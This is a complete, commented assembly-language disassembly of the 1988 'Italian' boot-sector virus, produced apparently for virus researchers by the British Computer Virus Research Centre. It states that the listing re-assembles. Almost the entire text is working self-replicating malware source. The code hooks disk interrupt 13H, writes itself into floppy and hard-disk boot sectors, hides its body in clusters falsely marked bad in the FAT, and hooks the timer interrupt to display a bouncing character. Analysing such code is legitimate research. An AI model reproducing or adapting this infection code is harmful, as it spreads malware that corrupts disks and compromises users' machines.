    page    65,132
    title   The 'Italian' Virus
; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; ;                 British Computer Virus Research Centre                   ;
; ;  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    ;
; ;  Telephone:     Domestic   0273-26105,   International  +44-273-26105    ;
; ;                                                                          ;
; ;                           The 'Italian' Virus                            ;
; ;                Disassembled by Joe Hirst,    October 1988                ;
; ;                                                                          ;
; ;                   Copyright (c) Joe Hirst 1988, 1989.                    ;
; ;                                                                          ;
; ;      This listing is only to be made available to virus researchers      ;
; ;                or software writers on a need-to-know basis.              ;
; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    ; The virus consists of a boot sector and two consecutive sectors on
    ; a floppy or hard disk.  These sectors are flagged as a bad clusters
    ; in the FAT.  The first of these sectors contains the rest of the
    ; code, and there is a pointer to this sector in the boot sector.
    ; The second sector contains the original boot sector.

    ; The disassembly has been tested by re-assembly using MASM 5.0.

    ; MASM would not assemble the instruction at offset 0043H (7C43H)
    ; This instruction is undefined on an 8088/8086, and illegal
    ; on a 80286/80386.

    ; The program requires an origin address of 7C00H, as it is designed
    ; to load and run as a boot sector.

    ; Each data field is defined twice in this listing, once within
    ; the CODE segment to define its contents and once in the RAM segment
    ; to define its location.

RAM SEGMENT AT 0

    ; System data

    ORG 20H
BW0020  DW  ?           ; Interrupt 8 offset
BW0022  DW  ?           ; Interrupt 8 segment
    ORG 4CH
BW004C  DW  ?           ; Interrupt 19 (13H) offset
BW004E  DW  ?           ; Interrupt 19 (13H) segment
    ORG 413H
BW0413  DW  ?           ; Total RAM size

    ; BPB of virus boot record

    ORG 7C0BH
BPB001  DW  ?           ; Bytes per sector
BPB002  DB  ?           ; Sectors per allocation unit
BPB003  DW  ?           ; Reserved sectors
BPB004  DB  ?           ; Number of FATs
BPB005  DW  ?           ; Number of root dir entries
BPB006  DW  ?           ; Number of sectors
BPB007  DB  ?           ; Media Descriptor
BPB008  DW  ?           ; Number of sectors per FAT
BPB009  DW  ?           ; Sectors per track
BPB010  DW  ?           ; Number of heads
BPB011  DW  ?           ; Number of hidden sectors (low order)

    ; Interrupt 19 (13H) branch address

    ORG 7D2AH

I13OFF  DW  ?           ; Original Int 19 (13H) offset
I13SEG  DW  ?           ; Original Int 19 (13H) segment

    ; Installation data area

    ORG 7DF3H
DATA01  DW  ?       ; Current FAT sector
DATA02  DW  ?       ; Sector number of first cluster
DATA03  DB  ?       ; Switches
                ;          - 01H - Nested interrupt 
                ;          - 02H - Timer interrupt installed
                ;          - 04H - 16-bit FAT
DATA04  DB  ?       ; Drive last used
DATA05  DW  ?       ; Sector number of rest of code
DATA06  DB  ?       ; ** Function unknown **
DATA07  DW  ?       ; Recognition code

    ; Data area

    ORG 7EB0H
DATA08  DW  ?           ; System time last called
DATA09  DB  ?           ; Processed FAT / 256

    ; Interrupt 8 branch address

    ORG 7FC9H
I08OFF  DW  ?           ; Original Int 8 offset
I08SEG  DW  ?           ; Original Int 8 segment

    ; Display data area

    ORG 7FCDH
VDU001  DW  ?           ; Character and attributes
VDU002  DW  ?           ; Row and column positions
VDU003  DW  ?           ; Row and column movement
VDU004  DB  ?           ; Graphics mode switch
VDU005  DW  ?           ; Mode and active page
VDU006  DB  ?           ; Visible columns - 1

    ; BPB of original boot record

    ORG 800BH
OBPB01  DW  ?           ; Bytes per sector
OBPB02  DB  ?           ; Sectors per allocation unit
OBPB03  DW  ?           ; Reserved sectors
OBPB04  DB  ?           ; Number of FATs
OBPB05  DW  ?           ; Number of root dir entries
OBPB06  DW  ?           ; Number of sectors
OBPB07  DB  ?           ; Media Descriptor
OBPB08  DW  ?           ; Number of sectors per FAT
OBPB09  DW  ?           ; Sectors per track
OBPB10  DW  ?           ; Number of heads
OBPB11  DW  ?           ; Number of hidden sectors (low order)

    ORG 81F5H
DATA10  DW  ?           ; Sector number of first cluster
DATA11  DB  ?   ; Switches - 01H - Nested interrupt 
            ;          - 02H - Timer interrupt installed
            ;          - 04H - 16-bit FAT
DATA12  DB  ?           ; Drive last used
DATA13  DW  ?           ; Sector number of rest of code
DATA14  DB  ?           ; ** Function unknown **
DATA15  DW  2 DUP (?)

RAM ENDS

CODE    SEGMENT BYTE PUBLIC 'CODE'
    ASSUME CS:CODE,DS:RAM

START:  JMP BP0010          ; Branch round BPB table

    DB  'MSDOS3.2'      ; OEM and version

    DW  512     ; BPB001 - Bytes per sector
    DB  2       ; BPB002 - Sectors per allocation unit
    DW  1       ; BPB003 - Reserved sectors
    DB  2       ; BPB004 - Number of FATs
    DW  112     ; BPB005 - Number of root dir entries
    DW  720     ; BPB006 - Number of sectors
    DB  0FDH        ; BPB007 - Media Descriptor
    DW  2       ; BPB008 - Number of sectors per FAT
    DW  9       ; BPB009 - Sectors per track
    DW  2       ; BPB010 - Number of heads
    DW  0       ; BPB011 - Number of hidden sectors (low order)

        ; Start of processing

    ; Hide 2k of RAM from system and move into this hidden area

BP0010: XOR AX,AX
    MOV SS,AX           ; Stack segment zero
    MOV SP,7C00H        ; Set stack pointer to start of buffer
    MOV DS,AX           ; Data segment zero
    MOV AX,BW0413       ; Get total RAM size
    SUB AX,2            ; Subtract 2k
    MOV BW0413,AX       ; Replace amended RAM size
    MOV CL,6            ; Number of positions to shift
    SHL AX,CL           ; Multiply RAM size by 64 (segment address)
    SUB AX,7C0H         ; Subtract buffer offset
    MOV ES,AX           ; Set target segment address
    MOV SI,7C00H        ; Load buffer target offset
    MOV DI,SI           ; Copy offset for source
    MOV CX,0100H        ; Number of words to move
    REPZ    MOVSW           ; Duplicate boot sector in high storage
;   MOV CS,AX           ; Load segment of new location
    DB  08EH, 0C8H      ; Previous command hard coded

    ; From this point on will be running in high storage

    PUSH    CS          ; \ Set DS equal to CS
    POP DS          ; /
    CALL    BP0020
BP0020: XOR AH,AH           ; Initialise disk sub-system
    INT 13H         ; Disk interrupt
    AND DATA04,80H      ; Isolate primary disk address
    MOV BX,DATA05       ; Get sector of rest of code
    PUSH    CS          ; \ Get current segment
    POP AX          ; /
    SUB AX,20H          ; Address back one sector
    MOV ES,AX           ; Set buffer segment for rest of code
    CALL    BP0040          ; Read rest of code
    MOV BX,DATA05       ; Get sector of rest of code
    INC BX          ; Address to boot sector store
    MOV AX,0FFC0H       ; Wrap-around address (= -400H)
    MOV ES,AX           ; Set buffer segment for boot sector
    CALL    BP0040          ; Read real boot sector
    XOR AX,AX
    MOV DATA03,AL       ; Set off all switches
    MOV DS,AX           ; Data segment zero
    MOV AX,BW004C       ; Save Int 19 (13H) offset
    MOV BX,BW004E       ; Save Int 19 (13H) segment
    MOV BW004C,OFFSET BP0080+7C00H  ; New Int 19 (13H) offset
    MOV BW004E,CS       ; New Int 19 (13H) segment
    PUSH    CS          ; \ Set DS equal to CS
    POP DS          ; /
    MOV I13OFF,AX       ; Store old Int 19 (13H) offset
    MOV I13SEG,BX       ; Store old Int 19 (13H) segment
    MOV DL,DATA04       ; Get drive number
    DB  0EAH            ; Far jump to boot sector
    DW  7C00H, 0

BP0030: MOV AX,301H         ; Write one sector
    JMP SHORT BP0050

BP0040: MOV AX,201H         ; Read one sector
BP0050: XCHG    BX,AX           ; Move sector number to AX
    ADD AX,BPB011       ; Add hidden sectors
    XOR DX,DX           ; Clear for division
    DIV BPB009          ; Divide by sectors per track
    INC DL          ; Add one to odd sectors
    MOV CH,DL           ; Save sector number
    XOR DX,DX           ; Clear for division
    DIV BPB010          ; Divide by number of heads
    MOV CL,6            ; Positions to move
    SHL AH,CL           ; Move top two bits of track
    OR  AH,CH           ; Move in sector number
    MOV CX,AX           ; Move to correct register
    XCHG    CH,CL           ; ..and correct position in reg
    MOV DH,DL           ; Move head number
    MOV AX,BX           ; Recover contents of AX
BP0060: MOV DL,DATA04       ; Get drive number
    MOV BX,8000H        ; Set buffer address
    INT 13H         ; Disk interrupt
    JNB BP0070          ; Branch if no errors
    POP AX
BP0070: RET

    ; Interrupt 19 (13H) (Disk) routine

BP0080: PUSH    DS
    PUSH    ES
    PUSH    AX
    PUSH    BX
    PUSH    CX
    PUSH    DX
    PUSH    CS          ; \ Set DS equal to CS
    POP DS          ; /
    PUSH    CS          ; \ Set ES equal to CS
    POP ES          ; /
    TEST    DATA03,1        ; Test nested interrupt switch
    JNZ BP0110          ; Exit if on
    CMP AH,2            ; Test for read sector
    JNE BP0110          ; Exit if not
    CMP DATA04,DL       ; Compare drive number
    MOV DATA04,DL       ; Save drive number
    JNE BP0100          ; Branch if different this time

    ; This is the activation code.  It has a 'window' of just less
    ; than a second, approximately every half hour, during which
    ; time a disk-read will switch it on.

    XOR AH,AH           ; Get system clock
    INT 1AH         ; System clock interrupt
    TEST    DH,7FH          ; Test low word high byte
    JNZ BP0090
    TEST    DL,0F0H         ; Test low word low byte
    JNZ BP0090
    PUSH    DX          ; Save system time
    CALL    BP0280          ; Install system clock routine
    POP DX          ; Recover system time
BP0090: MOV CX,DX           ; Copy system time
    SUB DX,DATA08       ; Interval since last call
    MOV DATA08,CX       ; Save system time
    SUB DX,24H          ; Subtract 2 seconds
    JB  BP0110          ; Return if less than two seconds
BP0100: OR  DATA03,1        ; Set on nested interrupt switch
    PUSH    SI
    PUSH    DI
    CALL    BP0120          ; Install on disk
    POP DI
    POP SI
    AND DATA03,0FEH     ; Set off nested interrupt switch
BP0110: POP DX
    POP CX
    POP BX
    POP AX
    POP ES
    POP DS
    DB  0EAH            ; Far jump to original Int 19 (13H)
    DW  01FBH           ; I13OFF - Original Int 19 (13H) offset
    DW  0C800H          ; I13SEG - Original Int 19 (13H) segment

    ; Disk installation

BP0120: MOV AX,201H         ; Read one sector
    MOV DH,0            ; Head number 0
    MOV CX,1            ; Track 0, sector 1
    CALL    BP0060          ; Read first sector from disk
    TEST    DATA04,80H      ; Test for hard drive
    JZ  BP0150          ; Branch if not

    ; Hard disk - partition table

    MOV SI,81BEH        ; Address to partition table
    MOV CX,4            ; Number of entries in table
BP0130: CMP BYTE PTR [SI+4],1   ; Test for DOS 12-bit FAT
    JE  BP0140          ; Branch if yes
    CMP BYTE PTR [SI+4],4   ; Test for DOS 16-bit FAT
    JE  BP0140          ; Branch if yes
    ADD SI,10H          ; Address to next entry
    LOOP    BP0130          ; Loop through table
    RET

    ; Hard disk - get boot record

BP0140: MOV DX,[SI]         ; Get head number of boot
    MOV CX,[SI+2]       ; Get track and sector of boot
    MOV AX,201H         ; Read one sector
    CALL    BP0060          ; Get boot sector for partition

    ; Boot sector processing

BP0150: MOV SI,8002H        ; Address to BPB source
    MOV DI,7C02H        ; Address to BPB target
    MOV CX,1CH          ; Length of BPB
    REPZ    MOVSB           ; Copy BPB
    CMP DATA15,1357H        ; Is virus installed already
    JNE BP0170          ; Branch if not
    CMP DATA14,0
    JNB BP0160
    MOV AX,DATA10       ; Get sector no of first cluster
    MOV DATA02,AX       ; Save it
    MOV SI,DATA13
    JMP BP0270

BP0160: RET

    ; Calculate location of FAT and first cluster

BP0170: CMP OBPB01,200H     ; Sector size 512
    JNE BP0160          ; Exit if different size
    CMP OBPB02,2        ; Sectors per cluster
    JB  BP0160          ; Exit if less than 2
    MOV CX,OBPB03       ; Get reserved sectors
    MOV AL,OBPB04       ; Number of FATs
    CBW             ; Fill out register
    MUL OBPB08          ; Sectors per FAT
    ADD CX,AX           ; Sector of root dir
    MOV AX,20H          ; Length of dir entry
    MUL OBPB05          ; Number of dir entries
    ADD AX,1FFH         ; Round up to whole sectors
    MOV BX,200H         ; Length of sector
    DIV BX          ; Sectors of root dir
    ADD CX,AX           ; Sector of first cluster
    MOV DATA02,CX       ; Save this
    MOV AX,BPB006       ; Get number of sectors
    SUB AX,DATA02       ; Subtract non-data sectors
    MOV BL,BPB002       ; Get sectors per cluster
    XOR DX,DX
    XOR BH,BH           ; Clear top of register
    DIV BX          ; Calculate number of clusters
    INC AX          ; Allow for number one not used
    MOV DI,AX
    AND DATA03,0FBH     ; Set off 16-bit FAT switch
    CMP AX,0FF0H        ; See if 12-bit FAT
    JBE BP0180          ; Branch if yes
    OR  DATA03,4        ; Set on 16-bit FAT switch
BP0180: MOV SI,1            ; Initialise FAT entry count
    MOV BX,BPB003       ; Get reserved sectors
    DEC BX          ; Allow for addition
    MOV DATA01,BX       ; Save current FAT sector
    MOV DATA09,0FEH     ; Set processed FAT length to -2
    JMP SHORT BP0190

    ; Data area

    DW  2       ; DATA01 - Current FAT sector
    DW  12      ; DATA02 - Sector number of first cluster
    DB  1       ; DATA03 - Switches
                ;        - 01H - Nested interrupt
                ;        - 02H - Timer interrupt installed
                ;        - 04H - 16-bit FAT
    DB  0       ; DATA04 - Drive last used
    DW  02B8H       ; DATA05 - Sector number of rest of code
    DB  0       ; DATA06 - ** Function unknown **
    DW  1357H, 0AA55H   ; DATA07 - Recognition code

        ; End of first sector, start of second

    ; Search FAT for unused cluster

BP0190: INC DATA01          ; Address to next FAT sector
    MOV BX,DATA01       ; Get next sector number
    ADD DATA09,2        ; Add to processed FAT length
    CALL    BP0040          ; Read FAT sector
    JMP SHORT BP0240

BP0200: MOV AX,3            ; Length of two FAT entries
    TEST    DATA03,4        ; Test 16-bit FAT switch
    JZ  BP0210          ; Branch if off
    INC AX          ; Four bytes not three
BP0210: MUL SI          ; Multiply by FAT entry number
    SHR AX,1            ; Divide by two
    SUB AH,DATA09       ; Subtract processed FAT length
    MOV BX,AX           ; Copy displacement
    CMP BX,1FFH         ; See if in this sector
    JNB BP0190          ; Branch if not
    MOV DX,[BX+8000H]       ; Get entry
    TEST    DATA03,4        ; Test 16-bit FAT switch
    JNZ BP0230          ; Branch if on
    MOV CL,4            ; Positions to move
    TEST    SI,1            ; Test for odd-numbered entry
    JZ  BP0220          ; Branch if not
    SHR DX,CL           ; Shift even entry into position
BP0220: AND DH,0FH          ; Switch off top bits
BP0230: TEST    DX,0FFFFH       ; Test all bits
    JZ  BP0250          ; Branch if none on
BP0240: INC SI          ; Next FAT entry
    CMP SI,DI           ; Has last entry been processed
    JBE BP0200          ; Branch if not
    RET

    ; Spare cluster found - install on disk

BP0250: MOV DX,0FFF7H       ; Load bad sector marker
    TEST    DATA03,4        ; Test 16-bit FAT switch
    JNZ BP0260          ; Branch if on
    AND DH,0FH          ; Convert marker to FF7H
    MOV CL,4            ; Bits to move
    TEST    SI,1            ; Test for odd-numbered entry
    JZ  BP0260          ; Branch if not
    SHL DX,CL           ; Move into position
BP0260: OR  [BX+8000H],DX       ; Put marker into FAT
    MOV BX,DATA01       ; Get sector number
    CALL    BP0030          ; Write FAT sector
    MOV AX,SI           ; Get entry number
    SUB AX,2            ; Subtract first cluster number
    MOV BL,BPB002       ; Get sectors per cluster
    XOR BH,BH           ; Clear top of register
    MUL BX          ; Convert to sectors
    ADD AX,DATA02       ; Add sector number of 1st`cluster
    MOV SI,AX           ; Save real sector number
    MOV BX,0            ; Sector zero
    CALL    BP0040          ; Read boot sector
    MOV BX,SI           ; Get output sector number
    INC BX          ; Address to next sector
    CALL    BP0030          ; Write boot sector to store
BP0270: MOV BX,SI           ; Get output sector number
    MOV DATA05,SI       ; Save sector no of rest of code
    PUSH    CS          ; \ Get current segment
    POP AX          ; /
    SUB AX,20H          ; Address back to virus (2)
    MOV ES,AX           ; Set buffer address
    CALL    BP0030          ; Write virus (2)
    PUSH    CS          ; \ Get current segment
    POP AX          ; /
    SUB AX,40H          ; Address back to virus (1)
    MOV ES,AX           ; Set buffer address
    MOV BX,0            ; Sector zero
    CALL    BP0030          ; Write virus (1)
    RET

    DW  20CH            ; DATA08 - System time last called
    DB  2           ; DATA09 - Processed FAT / 256

    ; Install interrupt 8 (system clock) routine if not done

BP0280: TEST    DATA03,2        ; Test INT 8 installed switch
    JNZ BP0290          ; Branch if on
    OR  DATA03,2        ; Set on INT 8 installed switch
    MOV AX,0            ; \ Segment zero
    MOV DS,AX           ; /
    MOV AX,BW0020       ; Save Int 8 offset
    MOV BX,BW0022       ; Save Int 8 segment
    MOV BW0020,OFFSET BP0300+7C00H  ; New Int 8 offset
    MOV BW0022,CS       ; New Int 8 segment
    PUSH    CS          ; \ Set DS equal to CS
    POP DS          ; /
    MOV I08OFF,AX       ; Store old Int 8 offset
    MOV I08SEG,BX       ; Store old Int 8 segment
BP0290: RET

    ; Interrupt 8 (system clock) routine

BP0300: PUSH    DS
    PUSH    AX
    PUSH    BX
    PUSH    CX
    PUSH    DX
    PUSH    CS          ; \ Set DS equal to CS
    POP DS          ; /
    MOV AH,0FH          ; Get VDU parameters
    INT 10H         ; VDU interrupt
    MOV BL,AL           ; VDU mode
    CMP BX,VDU005       ; Test mode and active page
    JE  BP0330          ; Branch if unchanged
    MOV VDU005,BX       ; Save mode and active page
    DEC AH          ; Visible columns
    MOV VDU006,AH       ; Save visible columns - 1
    MOV AH,1            ; Graphics mode switch on
    CMP BL,7            ; Test for teletype mode
    JNE BP0310          ; Branch if not
    DEC AH          ; Graphics mode switch off
BP0310: CMP BL,4            ; Test for graphics mode
    JNB BP0320          ; Branch if graphics or teletype
    DEC AH          ; Graphics mode switch off
BP0320: MOV VDU004,AH       ; Store graphics mode switch
    MOV VDU002,101H     ; Set row and column positions
    MOV VDU003,101H     ; Set row and column movement
    MOV AH,3            ; Get cursor address
    INT 10H         ; VDU interrupt
    PUSH    DX          ; Save cursor address
    MOV DX,VDU002       ; Get row and column positions
    JMP SHORT BP0350

BP0330: MOV AH,3            ; Get cursor address
    INT 10H         ; VDU interrupt
    PUSH    DX
    MOV AH,2            ; Set cursor address
    MOV DX,VDU002       ; Get row and column positions
    INT 10H         ; VDU interrupt
    MOV AX,VDU001       ; Get character and attributes
    CMP VDU004,1        ; Test for graphics mode
    JNE BP0340          ; Branch if not
    MOV AX,8307H        ; Character and write mode
BP0340: MOV BL,AH           ; Move attribute or write mode
    MOV CX,1            ; Only once
    MOV AH,9            ; Write character and attributes
    INT 10H         ; VDU interrupt
BP0350: MOV CX,VDU003       ; Get row and column movement
    CMP DH,0            ; Is row zero
    JNE BP0360          ; Branch if not
    XOR CH,0FFH         ; \ Reverse row movement
    INC CH          ; /
BP0360: CMP DH,18H          ; Is row 24
    JNE BP0370          ; Branch if not
    XOR CH,0FFH         ; \ Reverse row movement
    INC CH          ; /
BP0370: CMP DL,0            ; Is column 0
    JNE BP0380          ; Branch if not
    XOR CL,0FFH         ; \ Reverse column movement
    INC CL          ; /
BP0380: CMP DL,VDU006       ; Is column last visible column
    JNE BP0390          ; Branch if not
    XOR CL,0FFH         ; \ Reverse column movement
    INC CL          ; /
BP0390: CMP CX,VDU003       ; Compare row and column movement
    JNE BP0410          ; Branch if changed
    MOV AX,VDU001       ; Get character and attributes
    AND AL,7            ; Switch off top 5 bits of character
    CMP AL,3            ; Test bits 1 and 2
    JNE BP0400          ; Branch not equal
    XOR CH,0FFH         ; \ Reverse row movement
    INC CH          ; /
BP0400: CMP AL,5            ; Test bits 1 and 3
    JNE BP0410          ; Branch not equal
    XOR CL,0FFH         ; \ Reverse column movement
    INC CL          ; /
BP0410: ADD DL,CL           ; New column position
    ADD DH,CH           ; New row position
    MOV VDU003,CX       ; Save row and column movement
    MOV VDU002,DX       ; Save row and column positions
    MOV AH,2            ; Set cursor address
    INT 10H         ; VDU interrupt
    MOV AH,8            ; Read character and attributes
    INT 10H         ; VDU interrupt
    MOV VDU001,AX       ; Save character and attributes
    MOV BL,AH           ; Move attributes
    CMP VDU004,1        ; Test for graphics mode
    JNE BP0420          ; Branch if not
    MOV BL,83H          ; Write mode for graphics
BP0420: MOV CX,1            ; Once only
    MOV AX,907H         ; Write character and attributes
    INT 10H         ; VDU interrupt
    POP DX          ; Restore cursor address
    MOV AH,2            ; Set cursor address
    INT 10H         ; VDU interrupt
    POP DX
    POP CX
    POP BX
    POP AX
    POP DS
    DB  0EAH            ; Far jump to original Int 8
    DW  0907H           ; I08OFF - Original Int 8 offset
    DW  10BDH           ; I08SEG - Original Int 8 segment

    DW  0720H           ; VDU001 - Character and attributes
    DW  1533H           ; VDU002 - Row and column positions
    DW  01FFH           ; VDU003 - Row and column movement
    DB  0           ; VDU004 - Graphics mode switch
    DW  3           ; VDU005 - Mode and active page
    DB  4FH         ; VDU006 - Visible columns - 1

    ; This bit seems to be rubbish to fill out the sector

    DB  0B7H, 0B7H, 0B7H, 0B6H, 040H, 040H, 088H, 0DEH, 0E6H
    DB  05AH, 0ACH, 0D2H, 0E4H, 0EAH, 0E6H, 040H, 050H
    DB  0ECH, 040H, 064H, 05CH, 060H, 052H, 040H, 040H
    DB  040H, 040H, 064H, 062H, 05EH, 062H, 060H, 05EH
    DB  070H, 06EH, 040H, 041H, 0B7H, 0B7H, 0B7H, 0B6H

    ; End of second sector, original boot sector would start here

CODE    ENDS

    END START
